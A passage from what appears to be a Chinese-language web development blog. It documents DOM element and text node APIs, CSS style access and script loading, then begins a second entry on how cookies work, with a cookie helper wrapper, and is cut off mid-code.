<h2 id="三、元素节点"><a href="#三、元素节点" class="headerlink" title="三、元素节点"></a>三、元素节点</h2><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><ul>
<li>节点类型：ELEMENT_NODE —- 1</li>
<li>继承链： Object -&gt; EventTarget -&gt; Node -&gt; Element -&gt; HTMLElement -&gt; HTML*Element -&gt; <code>&lt;p&gt;</code></li>
<li>示例：document.querySelector(‘p’)</li>
</ul>
<h4 id="元素节点属性"><a href="#元素节点属性" class="headerlink" title="元素节点属性"></a>元素节点属性</h4><h6 id="tagName"><a href="#tagName" class="headerlink" title="tagName"></a>tagName</h6><ul>
<li>读写特性：只读</li>
<li>描述：获取元素的标签名，与 <code>nodeName</code> 值相同</li>
</ul>
<h6 id="attributes"><a href="#attributes" class="headerlink" title="attributes"></a>attributes</h6><ul>
<li>读写特性：只读</li>
<li>描述：获取元素上 属性 和 值 的集合（NamedNodeMap）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">正因为该集合为 NamedNodeMap 所以可以使用一下方法操作集合</span><br><span class="line">getNamedItem()</span><br><span class="line">setNamedItem()</span><br><span class="line">removeNamedItem()</span><br><span class="line">不推荐这种方式操作属性</span><br><span class="line">该属性的优势是所获取的集合是动态的，这样我们可以动态的知晓某元素上属性的数量</span><br></pre></td></tr></table></figure>
<h6 id="classList"><a href="#classList" class="headerlink" title="classList"></a>classList</h6><ul>
<li>读写特性：只读</li>
<li>描述：获取元素节点类属性和值的集合（类数组对象）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">el.classList.add(&apos;b&apos;)	// 添加b类</span><br><span class="line">el.classList.remove(&apos;b&apos;)	// 移除b类</span><br><span class="line">el.classList.toggle(&apos;b&apos;)	// 切换b类</span><br><span class="line">el.classList.contains(&apos;b&apos;)	// 判断el元素有没有b类</span><br><span class="line">el.classList.value 		// 返回值与 el.className 相同（类名被空格分隔的字符串）</span><br><span class="line">el.classList.length		// el元素拥有类的数量</span><br><span class="line">注意：IE9不支持 classList</span><br></pre></td></tr></table></figure>
<h6 id="dataset"><a href="#dataset" class="headerlink" title="dataset"></a>dataset</h6><ul>
<li>读写特性：只读</li>
<li>描述：返回一个对象，包含元素所有以 data-* 起始的属性</li>
</ul>
<p class="tip"><br>data-a-a 将要这样访问： el.dataset.aA (即转为驼峰)，可以使用 delete 语句删除一个data属性，另外IE9不支持该属性，可以使用 getAttribute/setAttribute/removeAttribute/hasAttribute 代替<br></p>

<h4 id="元素节点方法"><a href="#元素节点方法" class="headerlink" title="元素节点方法"></a>元素节点方法</h4><h6 id="getAttribute-attrName"><a href="#getAttribute-attrName" class="headerlink" title="getAttribute(attrName)"></a>getAttribute(attrName)</h6><ul>
<li><p>描述：获取元素节点上某一个属性的值</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} attrName</code> 属性名字</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{String}</code> 属性值</li>
</ul>
</li>
</ul>
<h6 id="setAttribute-attrName-attrValue"><a href="#setAttribute-attrName-attrValue" class="headerlink" title="setAttribute(attrName, attrValue)"></a>setAttribute(attrName, attrValue)</h6><ul>
<li><p>描述：获取元素节点上某一个属性的值</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} attrName</code> 属性名字</li>
<li><code>{String} attrValue</code> 属性值</li>
</ul>
</li>
</ul>
<h6 id="removeAttribute-attrName"><a href="#removeAttribute-attrName" class="headerlink" title="removeAttribute(attrName)"></a>removeAttribute(attrName)</h6><ul>
<li><p>描述：移除调用该方法的元素节点的某一属性</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} attrName</code> 属性名字</li>
</ul>
</li>
</ul>
<h6 id="hasAttribute-attrName"><a href="#hasAttribute-attrName" class="headerlink" title="hasAttribute(attrName)"></a>hasAttribute(attrName)</h6><ul>
<li><p>描述：判断元素是否有某一特定属性</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} attrName</code> 属性名字</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Boolean}</code> true 有，false 没有</li>
</ul>
</li>
</ul>
<p class="tip">因为 hasAttribute() 方法可以为布尔值型属性取得布尔值反馈，所以可以用来判断单选框复选框是否被选中</p>

<h6 id="querySelector-selector"><a href="#querySelector-selector" class="headerlink" title="querySelector(selector)"></a>querySelector(selector)</h6><ul>
<li><p>描述：根据css选择器返回第一个匹配的节点</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} selector</code> css选择器，支持css3</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Element | Null}</code> 匹配的元素节点 或 null</li>
</ul>
</li>
</ul>
<p class="tip">除了 document.querySelector() 外，还可以在指定元素下使用该方法 el.querySelector()</p>

<h6 id="querySelectorAll-selector"><a href="#querySelectorAll-selector" class="headerlink" title="querySelectorAll(selector)"></a>querySelectorAll(selector)</h6><ul>
<li><p>描述：根据css选择器匹配并返回符合的节点集合</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} selector</code> css选择器，支持css3</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Array}</code> 匹配的元素节点 或 null</li>
</ul>
</li>
</ul>
<p class="tip"><br>注意：querySelectorAll() 方法返回的节点集合是创建时文档的快照，并不是实时动态的。而 getElementsByTagName 和 getElementsByClassName 返回的节点集合则是动态的<br><br>加特技：除了 document.querySelectorAll() 外，还可以在指定元素下使用该方法 el.querySelectorAll()<br></p>

<h6 id="getElementsByClassName-className"><a href="#getElementsByClassName-className" class="headerlink" title="getElementsByClassName(className)"></a>getElementsByClassName(className)</h6><ul>
<li><p>描述：根据class值匹配并返回节点集合</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} className</code> class值</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{节点集合}</code> 节点集合</li>
</ul>
</li>
</ul>
<p class="tip">除了 document.getElementsByClassName() 外，还可以在指定元素下使用该方法 el.getElementsByClassName()</p>

<h6 id="getElementsByTagName-tagName"><a href="#getElementsByTagName-tagName" class="headerlink" title="getElementsByTagName(tagName)"></a>getElementsByTagName(tagName)</h6><ul>
<li><p>描述：根据class值匹配并返回节点集合</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} tagName</code> 标签名</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{节点集合}</code> 节点集合</li>
</ul>
</li>
</ul>
<p class="tip">除了 document.getElementsByTagName() 外，还可以在指定元素下使用该方法 el.getElementsByTagName()</p>

<h6 id="getElementsByName-name"><a href="#getElementsByName-name" class="headerlink" title="getElementsByName(name)"></a>getElementsByName(name)</h6><ul>
<li><p>描述：根据元素 name 属性值匹配并返回节点集合</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} name</code> 元素 name 属性值</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{节点集合}</code> 节点集合</li>
</ul>
</li>
</ul>
<h6 id="normalize"><a href="#normalize" class="headerlink" title="normalize()"></a>normalize()</h6><ul>
<li>描述：</li>
</ul>
<p>合并调用该方法元素的多个子文本节点为一个子文本节点，其后代元素节点下的子节点也会被合并，注意，只有两个文本子节点相邻是才会被合并</p>
<h4 id="几何量-与-滚动几何量"><a href="#几何量-与-滚动几何量" class="headerlink" title="几何量 与 滚动几何量"></a>几何量 与 滚动几何量</h4><h5 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h5><h6 id="offsetParent"><a href="#offsetParent" class="headerlink" title="offsetParent"></a>offsetParent</h6><ul>
<li>读写特性：只读</li>
<li>描述：获取定位父级</li>
</ul>
<p>offsetParent 的取值规则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、按照DOM树向上查找离调用该属性的元素最近的position属性不为static的祖先元素</span><br><span class="line">2、如果没有找到，那么&lt;body&gt;元素就是 offsetParent 的值</span><br><span class="line">3、如果在查询过程中，碰到 &lt;td&gt; &lt;th&gt; &lt;table&gt; 标签，那么 offsetParent 就为这些值</span><br></pre></td></tr></table></figure>
<h6 id="offsetTop"><a href="#offsetTop" class="headerlink" title="offsetTop"></a>offsetTop</h6><ul>
<li>读写特性：读写</li>
<li><p>描述：</p>
<p>  读：获取元素边框外沿 到 其定位父级边框内沿 的上距离</p>
<p>  写：设置元素边框外沿 到 其定位父级边框内沿 的上距离</p>
</li>
</ul>
<h6 id="offsetLeft"><a href="#offsetLeft" class="headerlink" title="offsetLeft"></a>offsetLeft</h6><ul>
<li>读写特性：读写</li>
<li><p>描述：</p>
<p>  读：获取元素边框外沿 到 其定位父级边框内沿 的左距离</p>
<p>  写：设置元素边框外沿 到 其定位父级边框内沿 的左距离</p>
</li>
</ul>
<h6 id="offsetHeight"><a href="#offsetHeight" class="headerlink" title="offsetHeight"></a>offsetHeight</h6><ul>
<li>读写特性：只读</li>
<li>描述：获取元素高 （边框 + 填充 + 内容）</li>
</ul>
<h6 id="offsetWidth"><a href="#offsetWidth" class="headerlink" title="offsetWidth"></a>offsetWidth</h6><ul>
<li>读写特性：只读</li>
<li>描述：获取元素宽 （边框 + 填充 + 内容）</li>
</ul>
<h6 id="clientHeight"><a href="#clientHeight" class="headerlink" title="clientHeight"></a>clientHeight</h6><ul>
<li>读写特性：只读</li>
<li>描述：获取元素的高 （填充 + 内容）</li>
</ul>
<h6 id="clientWidth"><a href="#clientWidth" class="headerlink" title="clientWidth"></a>clientWidth</h6><ul>
<li>读写特性：只读</li>
<li>描述：获取元素的宽 （填充 + 内容）</li>
</ul>
<h6 id="scrollHeight"><a href="#scrollHeight" class="headerlink" title="scrollHeight"></a>scrollHeight</h6><ul>
<li>读写特性：只读</li>
<li>描述：获取滚动元素的高度</li>
</ul>
<p class="tip">注意：如果滚动区域内的子节点比滚动区域小，那么该属性返回滚动区域的高度</p>

<h6 id="scrollWidth"><a href="#scrollWidth" class="headerlink" title="scrollWidth"></a>scrollWidth</h6><ul>
<li>读写特性：只读</li>
<li>描述：获取滚动元素的宽度</li>
</ul>
<p class="tip">注意：如果滚动区域内的子节点比滚动区域小，那么该属性返回滚动区域的宽度</p>

<h6 id="scrollTop"><a href="#scrollTop" class="headerlink" title="scrollTop"></a>scrollTop</h6><ul>
<li>读写特性：读写</li>
<li><p>描述：</p>
<p>  读：获取滚动元素当前已滚动的区域距离上边的距离</p>
<p>  写：使用JavaScript以编程的方式滚动元素到指定的距离</p>
</li>
</ul>
<h6 id="scrollLeft"><a href="#scrollLeft" class="headerlink" title="scrollLeft"></a>scrollLeft</h6><ul>
<li>读写特性：读写</li>
<li><p>描述：</p>
<p>  读：获取滚动元素当前已滚动的区域距离左边的距离</p>
<p>  写：使用JavaScript以编程的方式滚动元素到指定的距离</p>
</li>
</ul>
<h5 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h5><h6 id="getBoundingClientRect"><a href="#getBoundingClientRect" class="headerlink" title="getBoundingClientRect()"></a>getBoundingClientRect()</h6><ul>
<li><p>描述：获取元素相对于整个页面的位置（top/right/bottom/left），以及元素的宽高</p>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{Object}</code> 元素位置信息  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    top</span><br><span class="line">    right</span><br><span class="line">    bottom</span><br><span class="line">    left</span><br><span class="line">    width</span><br><span class="line">    height</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p class="tip"><br>    加特技：返回值中，width 和 height 为元素 （边框 + 填充 + 内容）的高度和宽度，与调用元素的 offsetHeight 与 offsetWidth 属性的返回值相同<br></p>

<h6 id="scrollIntoView-position"><a href="#scrollIntoView-position" class="headerlink" title="scrollIntoView(position)"></a>scrollIntoView(position)</h6><ul>
<li><p>描述：滚动调用该方法的元素到滚动元素的视区</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Boolean} position</code> true 滚动该元素到视区顶部，false 滚动该元素到视区底部。默认为 true</li>
</ul>
</li>
</ul>
<h2 id="四、文本节点"><a href="#四、文本节点" class="headerlink" title="四、文本节点"></a>四、文本节点</h2><h4 id="概述-2"><a href="#概述-2" class="headerlink" title="概述"></a>概述</h4><ul>
<li>节点类型：TEXT_NODE —- 3</li>
<li>继承链： Object -&gt; EventTarget -&gt; Node -&gt; CharacterData -&gt; Text -&gt; ‘asdfasdg’</li>
</ul>
<h4 id="文本节点属性"><a href="#文本节点属性" class="headerlink" title="文本节点属性"></a>文本节点属性</h4><h6 id="length"><a href="#length" class="headerlink" title="length"></a>length</h6><ul>
<li>描述：文本节点拥有length属性，返回该节点文本内容的长度</li>
</ul>
<h6 id="data"><a href="#data" class="headerlink" title="data"></a>data</h6><ul>
<li>描述：返回文本节点的字符串内容 与 nodeValue 的值相同</li>
</ul>
<h6 id="nodeValue-1"><a href="#nodeValue-1" class="headerlink" title="nodeValue"></a>nodeValue</h6><ul>
<li>描述：与 data 属性的值相同</li>
</ul>
<h4 id="文本节点方法"><a href="#文本节点方法" class="headerlink" title="文本节点方法"></a>文本节点方法</h4><h6 id="appendData-text"><a href="#appendData-text" class="headerlink" title="appendData(text)"></a>appendData(text)</h6><ul>
<li><p>描述：将text追加到节点末尾</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{String} text</code> 要追加的字符串</li>
</ul>
</li>
</ul>
<h6 id="insertData-offset-text"><a href="#insertData-offset-text" class="headerlink" title="insertData(offset, text)"></a>insertData(offset, text)</h6><ul>
<li><p>描述：在 offset 指定的位置前插入字符串 text</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Number} offset</code> 位置</li>
<li><code>{String} text</code> 要追加的字符串</li>
</ul>
</li>
</ul>
<h6 id="deleteData-offset-count"><a href="#deleteData-offset-count" class="headerlink" title="deleteData(offset, count)"></a>deleteData(offset, count)</h6><ul>
<li><p>描述：在 offset 指定的位置开始，删除 count 个字符，包括 offset 位置</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Number} offset</code> 位置</li>
<li><code>{Number} count</code> 删除字符的数量</li>
</ul>
</li>
</ul>
<h6 id="replaceData-offset-count-text"><a href="#replaceData-offset-count-text" class="headerlink" title="replaceData(offset, count, text)"></a>replaceData(offset, count, text)</h6><ul>
<li><p>描述：使用字符串 text 替换从 offset 指定的位置开始 count 个字符，包括 offset 位置</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Number} offset</code> 位置</li>
<li><code>{Number} count</code> 删除字符的数量</li>
<li><code>{String} text</code> 字符串</li>
</ul>
</li>
</ul>
<h6 id="substringData-offset-count"><a href="#substringData-offset-count" class="headerlink" title="substringData(offset, count)"></a>substringData(offset, count)</h6><ul>
<li><p>描述：获取从 offset 指定的位置开始 count 个字符，包括 offset 位置</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Number} offset</code> 位置</li>
<li><code>{Number} count</code> 获取字符的数量</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{String}</code> 获取到的字符串</li>
</ul>
</li>
</ul>
<h6 id="splitText-offset"><a href="#splitText-offset" class="headerlink" title="splitText(offset)"></a>splitText(offset)</h6><ul>
<li><p>描述：从 offset 指定的位置将调用该方法的文本节点分割成两个文本节点</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Number} offset</code> 分割的位置，该位置将包含在后一个文本节点中</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{TEXT_NODE}</code> 后一个文本节点的内容。</li>
</ul>
</li>
</ul>
<h2 id="五、CSS-样式-与-样式表"><a href="#五、CSS-样式-与-样式表" class="headerlink" title="五、CSS 样式 与 样式表"></a>五、CSS 样式 与 样式表</h2><h4 id="CSS-样式"><a href="#CSS-样式" class="headerlink" title="CSS 样式"></a>CSS 样式</h4><h6 id="元素的内联样式-style-属性"><a href="#元素的内联样式-style-属性" class="headerlink" title="元素的内联样式(style 属性)"></a>元素的内联样式(style 属性)</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 访问元素的 style 属性[el.style]，将返回 CSSStyleDeclaration 对象，仅包含该元素的内联样式，而不是计算后样式</span></span><br><span class="line"></span><br><span class="line">el.style.驼峰属性名</span><br><span class="line">el.style.setProperty(<span class="string">'css属性'</span>, <span class="string">'值'</span>)</span><br><span class="line">el.style.getProperty(<span class="string">'css属性'</span>)</span><br><span class="line">el.style.removeProperty(<span class="string">'css属性'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用一个由一系列css属性和值的字符串设置style的值</span></span><br><span class="line"><span class="comment">// 例：el.style.cssText = "width: 200px; height: 200px; background: red;"</span></span><br><span class="line">el.style.cssText</span><br></pre></td></tr></table></figure>
<h6 id="获取元素的计算后样式"><a href="#获取元素的计算后样式" class="headerlink" title="获取元素的计算后样式"></a>获取元素的计算后样式</h6><ul>
<li><p>window.getComputedStyle(element)</p>
</li>
<li><p>描述：获取元素计算后的样式</p>
</li>
<li><p>参数：</p>
<ul>
<li><code>{Element} element</code> 元素</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li><code>{CSSStyleDeclaration}</code> 包含元素属性键值对的对象</li>
</ul>
</li>
</ul>
<p class="tip"><br>与 el.style 一样，返回 CSSStyleDeclaration 对象，但不同的是，使用 getComputedStyle 获得的 CSSStyleDeclaration 对象下的属性时只读的，而通过 style 属性获得的 CSSStyleDeclaration 是可设置的。<br>另外，getComputedStyle 获得的颜色值始终都是 rgb() 格式，而通过style获得的颜色值就是你再内敛样式中所写的样子，并且在通过 getComputedStyle 获取的 transform 属性值为矩阵 matrix<br></p>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.getComputedStyle()</span><br><span class="line">作用：使用 window.getComputedStyle(el) 可以获取元素计算后的样式</span><br><span class="line">一个参数：元素</span><br><span class="line">返回值：与 el.style 一样，返回 CSSStyleDeclaration 对象，但不同的是，使用 getComputedStyle 获得的 CSSStyleDeclaration 对象下的属性时只读的，而通过 style 属性获得的 CSSStyleDeclaration 是可设置的。</span><br><span class="line">另外，getComputedStyle 获得的颜色值始终都是 rgb() 格式，而通过style获得的颜色值就是你再内敛样式中所写的样子，并且在通过 getComputedStyle 获取的 transform 属性值为矩阵 matrix</span><br></pre></td></tr></table></figure>
<h4 id="CSS样式表-与-CSS规则"><a href="#CSS样式表-与-CSS规则" class="headerlink" title="CSS样式表 与 CSS规则"></a>CSS样式表 与 CSS规则</h4><h6 id="CSS样式表"><a href="#CSS样式表" class="headerlink" title="CSS样式表"></a>CSS样式表</h6><p>使用 <code>&lt;link&gt;</code> 和 <code>&lt;style&gt;</code> 标签可以分别创建 外部 和 内部 样式表，一旦样式表被添加到HTML文档中，每个样式表将表示为一个 <code>CSSStyleSheet</code> 对象。该对象可以通过 <code>&lt;link&gt;</code> 或 <code>&lt;style&gt;</code> 标签元素的 sheet 属性访问： el.sheet</p>
<h6 id="CSS规则"><a href="#CSS规则" class="headerlink" title="CSS规则"></a>CSS规则</h6><p>每个样式表都是由一条条规则组成的(如：<code>body{background-color: red;</code> 为一条规则)，CSS规则表示为一个 <code>CSSStyleRule</code> 对象，可以通过 <code>el.sheet.cssRules[n]</code> 或者 <code>el.sheet.rules[n]</code> 访问该样式表的第 <code>n</code> 条规则</p>
<h6 id="访问所有样式表"><a href="#访问所有样式表" class="headerlink" title="访问所有样式表"></a>访问所有样式表</h6><p>可以使用 <code>document.styleSheets</code> 访问该文档的所有样式表，该属性返回由 <code>CSSStyleSheet</code> 对象组成的 <code>StyleSheetList</code> 对象</p>
<h2 id="六、DOM中的JavaScript"><a href="#六、DOM中的JavaScript" class="headerlink" title="六、DOM中的JavaScript"></a>六、DOM中的JavaScript</h2><h4 id="JavaScript默认是同步解析的"><a href="#JavaScript默认是同步解析的" class="headerlink" title="JavaScript默认是同步解析的"></a>JavaScript默认是同步解析的</h4><p>当DOM在解析时遇到 <code>&lt;script&gt;</code> 标签，将停止解析文档，并执行JavaScript脚本，如果是外部脚本，必须要下载后再解析，这将导致性能问题。</p>
<h4 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h4><p>可以使用 defer 属性推迟外部脚本的下载与执行，直到html文档解析完成。</p>
<h4 id="async"><a href="#async" class="headerlink" title="async"></a>async</h4><p>使用 async 属性异步下载并执行外部JavaScript文件</p>
<ul>
<li>不会阻塞DOM的解析与其他资源(如：图片、样式表)的下载</li>
<li>如果有多个外部JavaScript脚本拥有 <code>async</code> 属性，那么他们的执行顺序很可能不按照DOM中的顺序执行。先下载完的先执行</li>
<li>如果一个 <code>&lt;script&gt;</code> 元素同时存在 <code>defer</code> 和 <code>async</code> ，<code>async</code> 的优先级高</li>
<li>注意：使用JavaScript动态创建的 <code>&lt;script&gt;</code> 元素，并添加到DOM，那么该脚本将强制按照 <code>async</code> 的规则下载与执行</li>
<li>通过 <code>&lt;script&gt;</code> 元素的 <code>onload</code>、<code>onerror</code>、<code>load</code>、<code>error</code> 等事件，可以监听异步下载的JavaScript的下载情况</li>
</ul>
]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>DOM</tag>
      </tags>
  </entry>
  <entry>
    <title>ECMA-cookie和storage</title>
    <url>/2018/04/17/ECMA_cookie%E5%92%8Cstorage/</url>
    <content><![CDATA[<h2 id="cookie-详谈"><a href="#cookie-详谈" class="headerlink" title="cookie 详谈"></a>cookie 详谈</h2><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><code>cookie</code> 最初被设计用来存储回话信息。</p>
<p>我们知道 <code>HTTP</code> 是一种无状态的请求响应，即每次请求响应之后连接会立即或延时(保持一定的有效期)断开。下一次请求再重新建立连接，那么服务器如何知道你是上一次的那个连接？这个时候就需要一种方式，告诉服务器你的身份信息，<code>cookie</code> 就是来做这件事的。</p>
<p><code>cookie</code> 用来跟踪会话信息，第一次响应设置 <code>cookie</code>，以后的每次请求都会发送该 <code>cookie</code>。</p>
<h4 id="Set-Cookie-响应头"><a href="#Set-Cookie-响应头" class="headerlink" title="Set-Cookie 响应头"></a>Set-Cookie 响应头</h4><p>具体流程是：</p>
<p>对于一个 <code>HTTP</code> 请求，服务器可以通过 <code>Set-Cookie</code> 响应头设置 <code>cookie</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Set-Cookie: key=val</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>上面的响应头中，设置了名字为 <code>key</code>，值为 <code>val</code> 的cookie，这里需要注意的是，<code>key</code> 和 <code>val</code> 必须是 URL 编码的(<code>encodeURIComponent</code>)。在随后的请求中，浏览器通过在请求头中添加 <code>Cookie</code> 字段，携带信息给服务器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Cookie: key=val</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h4 id="Cookie-的限制"><a href="#Cookie-的限制" class="headerlink" title="Cookie 的限制"></a>Cookie 的限制</h4><h5 id="跨域的限制"><a href="#跨域的限制" class="headerlink" title="跨域的限制"></a>跨域的限制</h5><p>受同源策略的保护和限制，cookie 是绑定在特定的域名下的，这个限制一定程度上保护了 cookie 中的信息不回被其他域使用。</p>
<h5 id="数量和大小的限制"><a href="#数量和大小的限制" class="headerlink" title="数量和大小的限制"></a>数量和大小的限制</h5><p>cookie 是存在浏览器中的，如果一个 cookie 不是会话cookie，那么就要保存在磁盘中。这个时候，我们需要对 cookie 所能够存储的数据量进行限制，否则恶意的存储会撑爆用户的磁盘，这个限制是从数量和大小两个维度上定义的：</p>
<h6 id="数量的限制"><a href="#数量的限制" class="headerlink" title="数量的限制"></a>数量的限制</h6><p>数量限制是对于每个域而言的：</p>
<ul>
<li>IE6限制每个域 <code>20</code> 个cookie</li>
<li>IE7限制每个域最多 <code>50</code> 个cookie</li>
<li>Firefox限制每个域最多 <code>50</code> 个cookie</li>
<li>Opera限制每个域最多 <code>30</code> 个cookie</li>
<li>Safari 和 Chrome 没有明确硬性规定</li>
</ul>
<p>如果设置的 cookie 超过数量限制，各个浏览器的行为不同，有的会清空最早设置的cookie腾出空间，有的则会删除最近最少使用(LRU)的cookie腾出空间</p>
<h6 id="大小的限制"><a href="#大小的限制" class="headerlink" title="大小的限制"></a>大小的限制</h6><p>大多数浏览器限制整个 cookie 的长度大约为 4096B，即4KB。大小限制是针对所有cookie，而非单个cookie。</p>
<h4 id="Cookie-的结构"><a href="#Cookie-的结构" class="headerlink" title="Cookie 的结构"></a>Cookie 的结构</h4><p>如下图：</p>
<p><img src="/static/img/cookie.png" width="800"></p>
<p>上图中展示了响应头的 <code>Set-Cookie</code> 字段中设置cookie的所有可选的标志：</p>
<h5 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h5><p>cookie 的名称，cookie的名称是不区分大小写的，但是由于服务器在处理 cookie 的时候，可能会区分大小写，所以实践中，我们最好区分大小写。</p>
<p>注意：cookie名称必须是URL编码的</p>
<h5 id="值"><a href="#值" class="headerlink" title="值"></a>值</h5><p>存储在相应名称下的字符串值，该值也是URL编码的。</p>
<h5 id="域-domain"><a href="#域-domain" class="headerlink" title="域 - domain"></a>域 - domain</h5><p>指定cookie是对于哪个域有效的。</p>
<p>可以是子域(<a href="http://www.example.com)，也可不是(.example.com)，如果是主域，那么该cookie对所有子域都有效。" target="_blank" rel="noopener">www.example.com)，也可不是(.example.com)，如果是主域，那么该cookie对所有子域都有效。</a></p>
<h5 id="路径-path"><a href="#路径-path" class="headerlink" title="路径 - path"></a>路径 - path</h5><p>指定一个域下的一个路径，cookie 只对该路径有效。</p>
<p>例如：<code>path=/books/</code>，假设域为：<code>www.example.com</code>，那么cookie只有 <code>www.example.com/books/</code> 才能访问，而 <code>www.example.com</code> 则不能。</p>
<h5 id="过期时间-expires"><a href="#过期时间-expires" class="headerlink" title="过期时间 - expires"></a>过期时间 - expires</h5><p>表示cookie如何被删除。默认情况下，浏览器回话结束时会删除所有cookie，不过可以通过 <code>expires</code> 字段手动设置失效时间，<code>expires</code> 字段的值为 <code>GMT</code> 格式的日期字符串。</p>
<p>在 js 中，可以使用如下代码获取 <code>GMT</code> 格式的日期字符串：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString()</span><br></pre></td></tr></table></figure>
<h5 id="安全标志-secure"><a href="#安全标志-secure" class="headerlink" title="安全标志 - secure"></a>安全标志 - secure</h5><p>指定后，cookie 只有使用 SSL 连接的时候才会发送给服务器。</p>
<h5 id="HttpOnly-标志"><a href="#HttpOnly-标志" class="headerlink" title="HttpOnly 标志"></a>HttpOnly 标志</h5><p>指定后，cookie只能用于http层面，不能被客户端脚本读取。</p>
<p class="tip">以上字段中，只有名称和值是必须的</p>

<h4 id="Cookie-操作的封装"><a href="#Cookie-操作的封装" class="headerlink" title="Cookie 操作的封装"></a>Cookie 操作的封装</h4><p>使用 JavaScript 操作cookie，即操作 <code>document.cookie</code> 属性，这个属性设计的并不友好，这已经是众所周知的事实…..</p>
<p>当通过 <code>document.cookie</code> 获取 cookie 的时候，它返回一个字符串，包含所有可用的cookie信息，这个字符串又等号和分号分隔：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key1=val1;key2=val2;key3=val3</span><br></pre></td></tr></table></figure>
<p>其中，名称和值都是URL编码的，所以要通过 <code>decodeURIComponent</code> 解码。</p>
<p>当通过 <code>document.cookie</code> 设置值时，你要设置一个字符串，这个字符串与 <code>Set-Cookie</code> 响应头的格式一样，由分号和空格分隔。</p>
<p>设置 <code>document.cookie</code> 并不会覆盖cookie，除非设置的cookie已经存在。而会解析字符串，将你设置的cookie添加到已存在的cookie集合中。</p>
<p>需要注意的是，在设置cookie的时候，名称和值也是需要URL编码的。</p>
<p>为了更直观和方便的操作cookie，我们通常封装对 <code>document.cookie</code> 的操作，下面的代码来自《JavaScript高程》，并做了相应的修改：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> cookieUtil = &#123;</span><br><span class="line">    <span class="keyword">get</span>: function (name) &#123;</span><br><span class="line">        <span class="keyword">let</span> cookieName = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span>,</span><br><span class="line">            cookieStart = <span class="built_in">document</span>.cookie.indexOf(cookieName),</span><br><span class="line">            cookieValue = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cookieStart &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> cookieEnd = <span class="built_in">document</span>.cookie.indexOf(<span class="string">';'</span>, cookieStart);</span><br><span class="line">            <span class="keyword">if</span> (cookieEnd === <span class="number">-1</span>) &#123;</span><br><span class="line">                cookieEnd = <span class="built_in">document</span>.cookie.length;</span><br><span class="line">            &#125;</span><br><span class="line">            cookieValue = <span class="built_in">decodeURIComponent</span>(<span class="built_in">document</span>.cookie.substring(cookieStart + cookieName.length, cookieEnd));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cookieValue;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span>: function (name, value, expires, domain, path, secure, HttpOnly) &#123;</span><br><span class="line">        <span class="keyword">let</span> cookieText = <span class="built_in">encodeURIComponent</span>(name) + <span class="string">'='</span> + <span class="built_in">encodeURIComponent</span>(value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (expires <span class="keyword">instanceof</span> <span class="built_in">Date</span>) &#123;</span><br><span class="line">            cookieText += <span class="string">'; expires='</span> + expires.toGMTString();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (path) &#123;</span><br><span 